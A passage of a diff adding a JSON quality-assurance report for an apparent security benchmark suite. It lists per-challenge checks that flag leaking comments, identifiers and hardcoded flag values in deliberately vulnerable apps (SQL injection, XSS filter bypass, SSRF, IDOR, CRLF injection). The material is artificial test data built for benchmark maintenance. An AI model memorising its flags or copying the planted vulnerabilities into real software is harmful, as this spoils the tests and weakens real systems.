+            "app/Dockerfile: ARG flag=yes, used=yes"
+          ]
+        },
+        "config_description_leak": {
+          "pass": true,
+          "details": []
+        },
+        "direct_flag_access": {
+          "pass": true,
+          "details": []
+        },
+        "app_starts": {
+          "pass": false,
+          "status": "skipped",
+          "details": [
+            "Runtime start check skipped (no Docker in QA sandbox)"
+          ]
+        }
+      }
+    },
+    {
+      "benchmark": "S7BEN-EASY-007",
+      "checks": {
+        "flag_hardcoded": {
+          "pass": true,
+          "details": []
+        },
+        "comment_hints": {
+          "pass": false,
+          "details": [
+            {
+              "file": "app/templates/index.html",
+              "line": 60,
+              "snippet": "<!-- Exploitation Hint -->"
+            }
+          ]
+        },
+        "revealing_identifiers": {
+          "pass": false,
+          "details": [
+            {
+              "file": "app/templates/index.html",
+              "line": 62,
+              "identifier_like": "exploitation",
+              "snippet": "<h3 class=\"text-lg font-semibold text-gray-800 mb-4\">🎯 Exploitation Strategy</h3>"
+            }
+          ]
+        },
+        "docker_compose_healthchecks": {
+          "pass": true,
+          "details": []
+        },
+        "dockerfile_flag_arg": {
+          "pass": false,
+          "details": [
+            "app/Dockerfile: ARG flag=no, used=no"
+          ]
+        },
+        "config_description_leak": {
+          "pass": true,
+          "details": []
+        },
+        "direct_flag_access": {
+          "pass": true,
+          "details": []
+        },
+        "app_starts": {
+          "pass": false,
+          "status": "skipped",
+          "details": [
+            "Runtime start check skipped (no Docker in QA sandbox)"
+          ]
+        }
+      }
+    },
+    {
+      "benchmark": "S7BEN-EASY-008",
+      "checks": {
+        "flag_hardcoded": {
+          "pass": true,
+          "details": []
+        },
+        "comment_hints": {
+          "pass": true,
+          "details": []
+        },
+        "revealing_identifiers": {
+          "pass": false,
+          "details": [
+            {
+              "file": "Makefile",
+              "line": 32,
+              "identifier_like": "exploitation",
+              "snippet": "@echo \"=== SBEN-1010-T1 Exploitation Test ===\""
+            },
+            {
+              "file": "app/app.py",
+              "line": 216,
+              "identifier_like": "force",
+              "snippet": "data = request.get_json(force=True)"
+            },
+            {
+              "file": "app/templates/index.html",
+              "line": 73,
+              "identifier_like": "overflow-y-auto",
+              "snippet": "class=\"bg-gray-900 rounded p-4 h-96 overflow-y-auto text-sm text-red-400 whitespace-pre-wrap\">"
+            }
+          ]
+        },
+        "docker_compose_healthchecks": {
+          "pass": true,
+          "details": []
+        },
+        "dockerfile_flag_arg": {
+          "pass": false,
+          "details": [
+            "app/Dockerfile: ARG flag=no, used=no"
+          ]
+        },
+        "config_description_leak": {
+          "pass": true,
+          "details": []
+        },
+        "direct_flag_access": {
+          "pass": true,
+          "details": []
+        },
+        "app_starts": {
+          "pass": false,
+          "status": "skipped",
+          "details": [
+            "Runtime start check skipped (no Docker in QA sandbox)"
+          ]
+        }
+      }
+    },
+    {
+      "benchmark": "S7BEN-EASY-009",
+      "checks": {
+        "flag_hardcoded": {
+          "pass": true,
+          "details": []
+        },
+        "comment_hints": {
+          "pass": false,
+          "details": [
+            {
+              "file": "Makefile",
+              "line": 30,
+              "snippet": "# Clean up Docker resources"
+            },
+            {
+              "file": "Makefile",
+              "line": 39,
+              "snippet": "# Test exploitation flow"
+            },
+            {
+              "file": "app/app.py",
+              "line": 152,
+              "snippet": "# VULNERABLE: Select highest version regardless of source"
+            },
+            {
+              "file": "app/app.py",
+              "line": 299,
+              "snippet": "# ROUTES - EXPLOITATION VERIFICATION (Phase 3 Quality Endpoints)"
+            }
+          ]
+        },
+        "revealing_identifiers": {
+          "pass": false,
+          "details": [
+            {
+              "file": "Makefile",
+              "line": 41,
+              "identifier_like": "exploitation",
+              "snippet": "@echo \"=== SBEN-300-T1 Exploitation Test ===\""
+            },
+            {
+              "file": "app/app.py",
+              "line": 235,
+              "identifier_like": "source",
+              "snippet": "pkg_info, source, logs = resolve_fn(pkg_name, state)"
+            },
+            {
+              "file": "app/app.py",
+              "line": 339,
+              "identifier_like": "expected_exploit_path",
+              "snippet": "\"expected_exploit_path\": \"POST /build → installs company-utils==9.9.9 from public registry\","
+            },
+            {
+              "file": "app/templates/index.html",
+              "line": 67,
+              "identifier_like": "source",
+              "snippet": "{% if pkg.source == 'internal' %}bg-blue-600{% else %}bg-purple-600{% endif %}\">"
+            },
+            {
+              "file": "app/templates/index.html",
+              "line": 119,
+              "identifier_like": "overflow-y-auto",
+              "snippet": "class=\"bg-gray-900 rounded p-4 h-64 overflow-y-auto log-output text-sm text-green-400\">"
+            },
+            {
+              "file": "app/templates/index.html",
+              "line": 126,
+              "identifier_like": "exploitation",
+              "snippet": "<h3 class=\"text-lg font-semibold text-white mb-4\">🎯 Exploitation Status</h3>"
+            },
+            {
+              "file": "app/templates/index.html",
+              "line": 140,
+              "identifier_like": "exploitation",
+              "snippet": "<p class=\"text-sm text-gray-500 mt-2\">Trigger a build to attempt exploitation.</p>"
+            },
+            {
+              "file": "app/templates/index.html",
+              "line": 159,
+              "identifier_like": "exploitation",
+              "snippet": "<span class=\"text-gray-400\">Check exploitation</span>"
+            }
+          ]
+        },
+        "docker_compose_healthchecks": {
+          "pass": true,
+          "details": []
+        },
+        "dockerfile_flag_arg": {
+          "pass": false,
+          "details": [
+            "app/Dockerfile: ARG flag=no, used=no"
+          ]
+        },
+        "config_description_leak": {
+          "pass": true,
+          "details": []
+        },
+        "direct_flag_access": {
+          "pass": true,
+          "details": []
+        },
+        "app_starts": {
+          "pass": false,
+          "status": "skipped",
+          "details": [
+            "Runtime start check skipped (no Docker in QA sandbox)"
+          ]
+        }
+      }
+    },
+    {
+      "benchmark": "S7BEN-HARD-001",
+      "checks": {
+        "flag_hardcoded": {
+          "pass": true,
+          "details": []
+        },
+        "comment_hints": {
+          "pass": false,
+          "details": [
+            {
+              "file": "benchmark.yaml",
+              "line": 28,
+              "snippet": "- CWE-89  # SQL Injection"
+            },
+            {
+              "file": "benchmark.yaml",
+              "line": 185,
+              "snippet": "url: \"https://owasp.org/www-community/attacks/SQL_Injection_Bypassing_WAF\""
+            },
+            {
+              "file": "nginx-modsec/nginx.conf",
+              "line": 35,
+              "snippet": "# Health check endpoint (bypass ModSecurity)"
+            },
+            {
+              "file": "nginx-modsec/nginx.conf",
+              "line": 43,
+              "snippet": "# API endpoints (bypass ModSecurity for telemetry)"
+            },
+            {
+              "file": "nginx-modsec/modsec-config/custom.conf",
+              "line": 4,
+              "snippet": "# Enable detailed audit logging for SQLi attempts"
+            },
+            {
+              "file": "nginx-modsec/modsec-config/custom.conf",
+              "line": 9,
+              "snippet": "# Ensure SQLi rules are enforced"
+            },
+            {
+              "file": "nginx-modsec/modsec-config/custom.conf",
+              "line": 12,
+              "snippet": "# Additional SQLi patterns (beyond CRS default)"
+            },
+            {
+              "file": "app/app.py",
+              "line": 83,
+              "snippet": "# VULNERABLE QUERY - Direct injection in ORDER BY clause"
+            },
+            {
+              "file": "app/app.py",
+              "line": 93,
+              "snippet": "# Check if flag was retrieved (indicates successful exploitation)"
+            },
+            {
+              "file": "app/app.py",
+              "line": 97,
+              "snippet": "# Determine bypass technique based on sort parameter"
+            },
+            {
+              "file": "app/app.py",
+              "line": 115,
+              "snippet": "# Return error details (helpful for exploitation)"
+            }
+          ]
+        },
+        "revealing_identifiers": {
+          "pass": false,
+          "details": [
+            {
+              "file": "Makefile",
+              "line": 4,
+              "identifier_like": "waf_bypass_sql_1nj3ct10n_abc123def456",
+              "snippet": "FLAG ?= SBEN{waf_bypass_sql_1nj3ct10n_abc123def456}"
+            },
+            {
+              "file": "docker-compose.yml",
+              "line": 26,
+              "identifier_like": "waf_bypass_sql_1nj3ct10n_abc123def456",
+              "snippet": "- FLAG=${FLAG:-S7BEN{waf_bypass_sql_1nj3ct10n_abc123def456}}"
+            },
+            {
+              "file": "docker-compose.yml",
+              "line": 34,
+              "identifier_like": "waf_bypass_sql_1nj3ct10n_abc123def456",
+              "snippet": "- FLAG=${FLAG:-S7BEN{waf_bypass_sql_1nj3ct10n_abc123def456}}"
+            },
+            {
+              "file": "docker-compose.yml",
+              "line": 38,
+              "identifier_like": "ecommerce",
+              "snippet": "- DB_NAME=ecommerce"
+            },
+            {
+              "file": "docker-compose.yml",
+              "line": 58,
+              "identifier_like": "ecommerce",
+              "snippet": "- MYSQL_DATABASE=ecommerce"
+            },
+            {
+              "file": "nginx-modsec/modsec-config/custom.conf",
+              "line": 10,
+              "identifier_like": "sql_injection_score_threshold",
+              "snippet": "SecAction \"id:900001,phase:1,nolog,pass,t:none,setvar:tx.sql_injection_score_threshold=5\""
+            },
+            {
+              "file": "app/app.py",
+              "line": 16,
+              "identifier_like": "waf_bypass_sql_1nj3ct10n_abc123def456",
+              "snippet": "FLAG = os.environ.get('FLAG', 'S7BEN{waf_bypass_sql_1nj3ct10n_abc123def456}')"
+            },
+            {
+              "file": "app/app.py",
+              "line": 100,
+              "identifier_like": "bypass_technique",
+              "snippet": "telemetry['bypass_technique'] = 'comment_injection'"
+            },
+            {
+              "file": "app/app.py",
+              "line": 102,
+              "identifier_like": "bypass_technique",
+              "snippet": "telemetry['bypass_technique'] = 'case_variation'"
+            },
+            {
+              "file": "app/app.py",
+              "line": 104,
+              "identifier_like": "bypass_technique",
+              "snippet": "telemetry['bypass_technique'] = 'encoding'"
+            },
+            {
+              "file": "app/app.py",
+              "line": 106,
+              "identifier_like": "bypass_technique",
+              "snippet": "telemetry['bypass_technique'] = 'other'"
+            },
+            {
+              "file": "app/Dockerfile",
+              "line": 21,
+              "identifier_like": "waf_bypass_sql_1nj3ct10n_abc123def456",
+              "snippet": "ENV FLAG=${FLAG:-SBEN{waf_bypass_sql_1nj3ct10n_abc123def456}}"
+            }
+          ]
+        },
+        "docker_compose_healthchecks": {
+          "pass": true,
+          "details": []
+        },
+        "dockerfile_flag_arg": {
+          "pass": false,
+          "details": [
+            "nginx-modsec/Dockerfile: ARG flag=no, used=no",
+            "app/Dockerfile: ARG flag=yes, used=yes"
+          ]
+        },
+        "config_description_leak": {
+          "pass": true,
+          "details": []
+        },
+        "direct_flag_access": {
+          "pass": true,
+          "details": []
+        },
+        "app_starts": {
+          "pass": false,
+          "status": "skipped",
+          "details": [
+            "Runtime start check skipped (no Docker in QA sandbox)"
+          ]
+        }
+      }
+    },
+    {
+      "benchmark": "S7BEN-HARD-002",
+      "checks": {
+        "flag_hardcoded": {
+          "pass": true,
+          "details": []
+        },
+        "comment_hints": {
+          "pass": false,
+          "details": [
+            {
+              "file": "benchmark.yaml",
+              "line": 131,
+              "snippet": "url: \"https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html\""
+            },
+            {
+              "file": "Makefile",
+              "line": 3,
+              "snippet": "# SBEN-HARD-02: XSS with Input Sanitization Bypass"
+            },
+            {
+              "file": "app/server.js",
+              "line": 31,
+              "snippet": "cookie: { secure: false, httpOnly: false } // Vulnerable: allows XSS to read cookies"
+            },
+            {
+              "file": "app/server.js",
+              "line": 44,
+              "snippet": "// Custom blacklist filter (First layer - bypassable)"
+            },
+            {
+              "file": "app/server.js",
+              "line": 112,
+              "snippet": "// Track XSS attempts (basic detection)"
+            },
+            {
+              "file": "app/Dockerfile",
+              "line": 11,
+              "snippet": "# Copy application source"
+            },
+            {
+              "file": "app/views/admin.ejs",
+              "line": 68,
+              "snippet": "// Log page load (for exploitation verification)"
+            }
+          ]
+        },
+        "revealing_identifiers": {
+          "pass": false,
+          "details": [
+            {
+              "file": "docker-compose.yml",
+              "line": 10,
+              "identifier_like": "xss_sanitizer_byp4ss_svg_onload_def456",
+              "snippet": "- FLAG=${FLAG_WEB:-S7BEN{xss_sanitizer_byp4ss_svg_onload_def456}}"
+            },
+            {
+              "file": "callback/server.js",
+              "line": 8,
+              "identifier_like": "exploitsuccessful",
+              "snippet": "let exploitSuccessful = false;"
+            },
+            {
+              "file": "callback/server.js",
+              "line": 37,
+              "identifier_like": "exploitsuccessful",
+              "snippet": "exploitSuccessful = true;"
+            },
+            {
+              "file": "callback/server.js",
+              "line": 62,
+              "identifier_like": "exploitsuccessful",
+              "snippet": "exploitSuccessful = true;"
+            },
+            {
+              "file": "callback/server.js",
+              "line": 86,
+              "identifier_like": "exploitsuccessful",
+              "snippet": "exploitSuccessful = false;"
+            },
+            {
+              "file": "app/server.js",
+              "line": 10,
+              "identifier_like": "xss_sanitizer_byp4ss_svg_onload_def456",
+              "snippet": "const FLAG = process.env.FLAG || 'SBEN{xss_sanitizer_byp4ss_svg_onload_def456}';"
+            },
+            {
+              "file": "app/server.js",
+              "line": 18,
+              "identifier_like": "xssattempts",
+              "snippet": "let xssAttempts = 0;"
+            },
+            {
+              "file": "app/server.js",
+              "line": 171,
+              "identifier_like": "xssattempts",
+              "snippet": "xssAttempts = 0;"
+            }
+          ]
+        },
+        "docker_compose_healthchecks": {
+          "pass": true,
+          "details": []
+        },
+        "dockerfile_flag_arg": {
+          "pass": false,
+          "details": [
+            "callback/Dockerfile: ARG flag=no, used=no",
+            "app/Dockerfile: ARG flag=no, used=no"
+          ]
+        },
+        "config_description_leak": {
+          "pass": true,
+          "details": []
+        },
+        "direct_flag_access": {
+          "pass": true,
+          "details": []
+        },
+        "app_starts": {
+          "pass": false,
+          "status": "skipped",
+          "details": [
+            "Runtime start check skipped (no Docker in QA sandbox)"
+          ]
+        }
+      }
+    },
+    {
+      "benchmark": "S7BEN-HARD-003",
+      "checks": {
+        "flag_hardcoded": {
+          "pass": true,
+          "details": []
+        },
+        "comment_hints": {
+          "pass": false,
+          "details": [
+            {
+              "file": "benchmark.yaml",
+              "line": 165,
+              "snippet": "url: \"https://portswigger.net/web-security/ssrf\""
+            },
+            {
+              "file": "Makefile",
+              "line": 3,
+              "snippet": "# SBEN-HARD-03: SSRF with URL Filtering"
+            },
+            {
+              "file": "app/app.py",
+              "line": 25,
+              "snippet": "# Security filters (intentionally bypassable)"
+            }
+          ]
+        },
+        "revealing_identifiers": {
+          "pass": false,
+          "details": [
+            {
+              "file": "docker-compose.yml",
+              "line": 10,
+              "identifier_like": "ssrf_internal_acc3ss_dns_rebind_789abc",
+              "snippet": "- FLAG=${FLAG:-S7BEN{ssrf_internal_acc3ss_dns_rebind_789abc}}"
+            },
+            {
+              "file": "docker-compose.yml",
+              "line": 31,
+              "identifier_like": "ssrf_internal_acc3ss_dns_rebind_789abc",
+              "snippet": "- FLAG=${FLAG_INTERNAL:-S7BEN{ssrf_internal_acc3ss_dns_rebind_789abc}}"
+            },
+            {
+              "file": "internal/api.py",
+              "line": 12,
+              "identifier_like": "ssrf_internal_acc3ss_dns_rebind_789abc",
+              "snippet": "FLAG = os.getenv('FLAG_INTERNAL', 'S7BEN{ssrf_internal_acc3ss_dns_rebind_789abc}')"
+            },
+            {
+              "file": "app/app.py",
+              "line": 19,
+              "identifier_like": "ssrf_attempts",
+              "snippet": "ssrf_attempts = 0"
+            },
+            {
+              "file": "app/app.py",
+              "line": 30,
+              "identifier_like": "ssrf_internal_acc3ss_dns_rebind_789abc",
+              "snippet": "FLAG = os.getenv('FLAG', 'S7BEN{ssrf_internal_acc3ss_dns_rebind_789abc}')"
+            },
+            {
+              "file": "app/app.py",
+              "line": 34,
+              "identifier_like": "bypassable",
+              "snippet": "URL validation function with multiple bypassable filters"
+            },
+            {
+              "file": "app/app.py",
+              "line": 108,
+              "identifier_like": "ssrf_attempts",
+              "snippet": "ssrf_attempts += 1"
+            },
+            {
+              "file": "app/app.py",
+              "line": 171,
+              "identifier_like": "ssrf_attempts",
+              "snippet": "ssrf_attempts = 0"
+            }
+          ]
+        },
+        "docker_compose_healthchecks": {
+          "pass": true,
+          "details": []
+        },
+        "dockerfile_flag_arg": {
+          "pass": false,
+          "details": [
+            "internal/Dockerfile: ARG flag=no, used=no",
+            "app/Dockerfile: ARG flag=no, used=no",
+            "metadata/Dockerfile: ARG flag=no, used=no"
+          ]
+        },
+        "config_description_leak": {
+          "pass": true,
+          "details": []
+        },
+        "direct_flag_access": {
+          "pass": true,
+          "details": []
+        },
+        "app_starts": {
+          "pass": false,
+          "status": "skipped",
+          "details": [
+            "Runtime start check skipped (no Docker in QA sandbox)"
+          ]
+        }
+      }
+    },
+    {
+      "benchmark": "S7BEN-HARD-004",
+      "checks": {
+        "flag_hardcoded": {
+          "pass": true,
+          "details": []
+        },
+        "comment_hints": {
+          "pass": false,
+          "details": [
+            {
+              "file": "app/app.py",
+              "line": 168,
+              "snippet": "# Should use algorithms=['RS256'] to enforce specific algorithm"
+            }
+          ]
+        },
+        "revealing_identifiers": {
+          "pass": true,
+          "details": []
+        },
+        "docker_compose_healthchecks": {
+          "pass": true,
+          "details": []
+        },
+        "dockerfile_flag_arg": {
+          "pass": false,
+          "details": [
+            "app/Dockerfile: ARG flag=no, used=no"
+          ]
+        },
+        "config_description_leak": {
+          "pass": true,
+          "details": []
+        },
+        "direct_flag_access": {
+          "pass": true,
+          "details": []
+        },
+        "app_starts": {
+          "pass": false,
+          "status": "skipped",
+          "details": [
+            "Runtime start check skipped (no Docker in QA sandbox)"
+          ]
+        }
+      }
+    },
+    {
+      "benchmark": "S7BEN-HARD-010",
+      "checks": {
+        "flag_hardcoded": {
+          "pass": true,
+          "details": []
+        },
+        "comment_hints": {
+          "pass": false,
+          "details": [
+            {
+              "file": "app/app.py",
+              "line": 253,
+              "snippet": "# Track SQLi attempts (for telemetry)"
+            },
+            {
+              "file": "app/app.py",
+              "line": 269,
+              "snippet": "# VULNERABLE: String concatenation with blind SQLi"
+            },
+            {
+              "file": "app/app.py",
+              "line": 277,
+              "snippet": "# Track time delays (indicates time-based SQLi)"
+            }
+          ]
+        },
+        "revealing_identifiers": {
+          "pass": false,
+          "details": [
+            {
+              "file": "Makefile",
+              "line": 4,
+              "identifier_like": "strike7-sqli-t3-waf-secret",
+              "snippet": "FLAG_SECRET ?= strike7-sqli-t3-waf-secret"
+            },
+            {
+              "file": "docker-compose.yml",
+              "line": 10,
+              "identifier_like": "-strike7-sqli-t3-waf-secret",
+              "snippet": "- FLAG_SECRET=${FLAG_SECRET:-strike7-sqli-t3-waf-secret}"
+            },
+            {
+              "file": "app/app.py",
+              "line": 33,
+              "identifier_like": "strike7-sqli-t3-waf-secret",
+              "snippet": "FLAG_SECRET = os.environ.get('FLAG_SECRET', 'strike7-sqli-t3-waf-secret')"
+            },
+            {
+              "file": "app/app.py",
+              "line": 43,
+              "identifier_like": "sqlite3",
+              "snippet": "conn = sqlite3.connect(DB_PATH)"
+            },
+            {
+              "file": "app/app.py",
+              "line": 44,
+              "identifier_like": "sqlite3",
+              "snippet": "conn.row_factory = sqlite3.Row"
+            },
+            {
+              "file": "app/app.py",
+              "line": 200,
+              "identifier_like": "blind_sqli_waf_bypass",
+              "snippet": "data = f\"blind_sqli_waf_bypass:{password_extracted}:{stealth_score}:{timestamp}\""
+            },
+            {
+              "file": "app/app.py",
+              "line": 254,
+              "identifier_like": "sqli_indicators",
+              "snippet": "sqli_indicators = [\"sleep\", \"waitfor\", \"benchmark\", \"substring\", \"ascii\", \"char\"]"
+            },
+            {
+              "file": "app/app.py",
+              "line": 256,
+              "identifier_like": "sqli_attempts",
+              "snippet": "state['telemetry']['sqli_attempts'] += 1"
+            },
+            {
+              "file": "app/app.py",
+              "line": 416,
+              "identifier_like": "ndsqli_2026",
+              "snippet": "flag = generate_flag('Bl!ndSQLi_2026', stealth_score, int(time.time()))"
+            },
+            {
+              "file": "app/templates/index.html",
+              "line": 20,
+              "identifier_like": "e-commerce",
+              "snippet": "<p class=\"text-sm text-slate-400\">Enterprise E-Commerce Platform</p>"
+            },
+            {
+              "file": "app/templates/index.html",
+              "line": 70,
+              "identifier_like": "injection",
+              "snippet": "<p class=\"text-xs text-slate-400\">WAF enabled • SQL injection protection • Rate limiting</p>"
+            }
+          ]
+        },
+        "docker_compose_healthchecks": {
+          "pass": true,
+          "details": []
+        },
+        "dockerfile_flag_arg": {
+          "pass": false,
+          "details": [
+            "app/Dockerfile: ARG flag=no, used=no"
+          ]
+        },
+        "config_description_leak": {
+          "pass": true,
+          "details": []
+        },
+        "direct_flag_access": {
+          "pass": true,
+          "details": []
+        },
+        "app_starts": {
+          "pass": false,
+          "status": "skipped",
+          "details": [
+            "Runtime start check skipped (no Docker in QA sandbox)"
+          ]
+        }
+      }
+    },
+    {
+      "benchmark": "S7BEN-HARD-011",
+      "checks": {
+        "flag_hardcoded": {
+          "pass": true,
+          "details": []
+        },
+        "comment_hints": {
+          "pass": false,
+          "details": [
+            {
+              "file": "app/app.py",
+              "line": 87,
+              "snippet": "# Block obvious XSS"
+            },
+            {
+              "file": "app/app.py",
+              "line": 168,
+              "snippet": "# Apply sanitization (bypassable)"
+            }
+          ]
+        },
+        "revealing_identifiers": {
+          "pass": false,
+          "details": [
+            {
+              "file": "Makefile",
+              "line": 4,
+              "identifier_like": "strike7-csp-xss-t3-secret",
+              "snippet": "FLAG_SECRET ?= strike7-csp-xss-t3-secret"
+            },
+            {
+              "file": "docker-compose.yml",
+              "line": 10,
+              "identifier_like": "-strike7-csp-xss-t3-secret",
+              "snippet": "- FLAG_SECRET=${FLAG_SECRET:-strike7-csp-xss-t3-secret}"
+            },
+            {
+              "file": "app/app.py",
+              "line": 31,
+              "identifier_like": "strike7-csp-xss-t3-secret",
+              "snippet": "FLAG_SECRET = os.environ.get('FLAG_SECRET', 'strike7-csp-xss-t3-secret')"
+            },
+            {
+              "file": "app/app.py",
+              "line": 99,
+              "identifier_like": "xss_attempts",
+              "snippet": "state['telemetry']['xss_attempts'] += 1"
+            },
+            {
+              "file": "app/app.py",
+              "line": 109,
+              "identifier_like": "csp_bypass_gadget",
+              "snippet": "data = f\"csp_bypass_gadget:{session_id}:{username}:{method}:{timestamp}\""
+            },
+            {
+              "file": "app/app.py",
+              "line": 217,
+              "identifier_like": "csp_bypass_successful",
+              "snippet": "state['csp_bypass_successful'] = True"
+            },
+            {
+              "file": "app/templates/index.html",
+              "line": 20,
+              "identifier_like": "e-commerce",
+              "snippet": "<p class=\"text-slate-400 mb-8\">Enterprise E-Commerce Platform</p>"
+            },
+            {
+              "file": "app/templates/victim.html",
+              "line": 17,
+              "identifier_like": "bypass",
+              "snippet": "<h2 class=\"text-2xl font-bold mb-4\">CSP Bypass Exploitation Scenario</h2>"
+            }
+          ]
+        },
+        "docker_compose_healthchecks": {
+          "pass": true,
+          "details": []
+        },
+        "dockerfile_flag_arg": {
+          "pass": false,
+          "details": [
+            "app/Dockerfile: ARG flag=no, used=no"
+          ]
+        },
+        "config_description_leak": {
+          "pass": true,
+          "details": []
+        },
+        "direct_flag_access": {
+          "pass": true,
+          "details": []
+        },
+        "app_starts": {
+          "pass": false,
+          "status": "skipped",
+          "details": [
+            "Runtime start check skipped (no Docker in QA sandbox)"
+          ]
+        }
+      }
+    },
+    {
+      "benchmark": "S7BEN-HARD-012",
+      "checks": {
+        "flag_hardcoded": {
+          "pass": true,
+          "details": []
+        },
+        "comment_hints": {
+          "pass": false,
+          "details": [
+            {
+              "file": "benchmark.yaml",
+              "line": 43,
+              "snippet": "bypass_depth: 2            # Role check + missing ownership check"
+            },
+            {
+              "file": "app/app.py",
+              "line": 306,
+              "snippet": "# VULNERABILITY: Return record regardless of assignment (IDOR!)"
+            }
+          ]
+        },
+        "revealing_identifiers": {
+          "pass": false,
+          "details": [
+            {
+              "file": "app/app.py",
+              "line": 31,
+              "identifier_like": "strike7-idor-authz-secret-key-temp",
+              "snippet": "app.secret_key = os.environ.get('SECRET_KEY', 'strike7-idor-authz-secret-key-temp')"
+            },
+            {
+              "file": "app/app.py",
+              "line": 298,
+              "identifier_like": "idor_exploited",
+              "snippet": "state['idor_exploited'] = True"
+            },
+            {
+              "file": "app/templates/index.html",
+              "line": 122,
+              "identifier_like": "idorwarning",
+              "snippet": "<div id=\"idorWarning\" class=\"hidden mt-4 p-4 bg-red-50 border border-red-200 rounded-lg\">"
+            },
+            {
+              "file": "app/templates/index.html",
+              "line": 192,
+              "identifier_like": "overflow-x-auto",
+              "snippet": "<div class=\"overflow-x-auto\">"
+            },
+            {
+              "file": "app/templates/index.html",
+              "line": 243,
+              "identifier_like": "idor_detected",
+              "snippet": "const isUnauthorized = data.idor_detected || false;"
+            },
+            {
+              "file": "app/templates/index.html",
+              "line": 255,
+              "identifier_like": "idorwarning",
+              "snippet": "const warningDiv = document.getElementById('idorWarning');"
+            }
+          ]
+        },
+        "docker_compose_healthchecks": {
+          "pass": true,
+          "details": []
+        },
+        "dockerfile_flag_arg": {
+          "pass": false,
+          "details": [
+            "app/Dockerfile: ARG flag=no, used=no"
+          ]
+        },
+        "config_description_leak": {
+          "pass": true,
+          "details": []
+        },
+        "direct_flag_access": {
+          "pass": true,
+          "details": []
+        },
+        "app_starts": {
+          "pass": false,
+          "status": "skipped",
+          "details": [
+            "Runtime start check skipped (no Docker in QA sandbox)"
+          ]
+        }
+      }
+    },
+    {
+      "benchmark": "S7BEN-HARD-013",
+      "checks": {
+        "flag_hardcoded": {
+          "pass": true,
+          "details": []
+        },
+        "comment_hints": {
+          "pass": false,
+          "details": [
+            {
+              "file": "benchmark.yaml",
+              "line": 51,
+              "snippet": "bypass_depth: 2            # Input sanitization + log integrity warnings"
+            },
+            {
+              "file": "benchmark.yaml",
+              "line": 52,
+              "snippet": "chain_length: 3            # CRLF injection → fake log entry → privilege escalation"
+            }
+          ]
+        },
+        "revealing_identifiers": {
+          "pass": false,
+          "details": [
+            {
+              "file": "app/app.py",
+              "line": 270,
+              "identifier_like": "crlf_injection_detected",
+              "snippet": "state['crlf_injection_detected'] = True"
+            },
+            {
+              "file": "app/templates/admin.html",
+              "line": 23,
+              "identifier_like": "overflow-auto",
+              "snippet": "<div id=\"logsContainer\" class=\"hidden bg-white rounded-lg shadow-md p-6\"><h3 class=\"text-lg font-bold mb-4\">Audit Logs</h3><pre id=\"logsContent\" class=\"bg-gray-50 p-4 rounded border text-xs overflow-auto\" style=\"max-height:400px\"></pre></div>"
+            }
+          ]
+        },
+        "docker_compose_healthchecks": {
+          "pass": true,
+          "details": []
+        },
+        "dockerfile_flag_arg": {
+          "pass": false,
+          "details": [
+            "app/Dockerfile: ARG flag=no, used=no"
+          ]
+        },
+        "config_description_leak": {
+          "pass": true,
+          "details": []
+        },
+        "direct_flag_access": {
+          "pass": true,
+          "details": []
+        },
+        "app_starts": {
+          "pass": false,
+          "status": "skipped",
+          "details": [
+            "Runtime start check skipped (no Docker in QA sandbox)"
+          ]
+        }
+      }
+    },
+    {
+      "benchmark": "S7BEN-HARD-014",
+      "checks": {
+        "flag_hardcoded": {
+          "pass": true,
+          "details": []
+        },
+        "comment_hints": {
+          "pass": true,
+          "details": []
+        },
+        "revealing_identifiers": {
+          "pass": true,
+          "details": []
+        },
+        "docker_compose_healthchecks": {
+          "pass": false,
+          "details": [
+            "No 'healthcheck' found in docker-compose.yml"
+          ]
+        },
+        "dockerfile_flag_arg": {
+          "pass": false,
+          "details": [
+            "app/Dockerfile: ARG flag=no, used=no"
+          ]
+        },
+        "config_description_leak": {
+          "pass": true,
+          "details": []
+        },
+        "direct_flag_access": {
+          "pass": true,
+          "details": []
+        },
+        "app_starts": {
+          "pass": false,
+          "status": "skipped",
+          "details": [
+            "Runtime start check skipped (no Docker in QA sandbox)"
+          ]
+        }
+      }
+    },
+    {
+      "benchmark": "S7BEN-HARD-015",
+      "checks": {
+        "flag_hardcoded": {
+          "pass": true,
+          "details": []
+        },
+        "comment_hints": {
+          "pass": true,
+          "details": []
+        },
+        "revealing_identifiers": {
+          "pass": true,
+          "details": []
+        },
+        "docker_compose_healthchecks": {
+          "pass": false,
+          "details": [
+            "No 'healthcheck' found in docker-compose.yml"
+          ]
+        },
+        "dockerfile_flag_arg": {
+          "pass": false,
+          "details": [
+            "app/Dockerfile: ARG flag=no, used=no"
+          ]
+        },
+        "config_description_leak": {
+          "pass": true,
+          "details": []
+        },
+        "direct_flag_access": {
+          "pass": true,
+          "details": []
+        },
+        "app_starts": {
+          "pass": false,
+          "status": "skipped",
+          "details": [
+            "Runtime start check skipped (no Docker in QA sandbox)"
+          ]
+        }
+      }
+    },
+    {
+      "benchmark": "S7BEN-HARD-016",
+      "checks": {
+        "flag_hardcoded": {
+          "pass": true,
+          "details": []
+        },
+        "comment_hints": {
+          "pass": true,
+          "details": []
+        },
+        "revealing_identifiers": {
+          "pass": true,
+          "details": []
+        },
+        "docker_compose_healthchecks": {
+          "pass": false,
+          "details": [
+            "No 'healthcheck' found in docker-compose.yml"
+          ]
+        },
+        "dockerfile_flag_arg": {
+          "pass": false,
+          "details": [
+            "app/Dockerfile: ARG flag=no, used=no"
+          ]
+        },
+        "config_description_leak": {
+          "pass": false,
+          "details": [
+            "No description found in benchmark.yaml"
+          ]
+        },
+        "direct_flag_access": {
+          "pass": true,
+          "details": []
+        },
+        "app_starts": {
+          "pass": false,
+          "status": "skipped",
+          "details": [
+            "Runtime start check skipped (no Docker in QA sandbox)"
+          ]
+        }
+      }
+    },
+    {
+      "benchmark": "S7BEN-HARD-017",
+      "checks": {
+        "flag_hardcoded": {
+          "pass": true,
+          "details": []
+        },
+        "comment_hints": {
+          "pass": true,
+          "details": []
+        },
+        "revealing_identifiers": {
+          "pass": true,
+          "details": []
+        },
+        "docker_compose_healthchecks": {
+          "pass": false,
+          "details": [
+            "No 'healthcheck' found in docker-compose.yml"
+          ]
+        },
+        "dockerfile_flag_arg": {
+          "pass": false,
+          "details": [
+            "app/Dockerfile: ARG flag=no, used=no"
+          ]
+        },
+        "config_description_leak": {
+          "pass": false,
+          "details": [
+            "No description found in benchmark.yaml"
+          ]
+        },
+        "direct_flag_access": {
+          "pass": true,
+          "details": []
+        },
+        "app_starts": {
+          "pass": false,
+          "status": "skipped",
+          "details": [
+            "Runtime start check skipped (no Docker in QA sandbox)"
+          ]
+        }
+      }
+    },
+    {
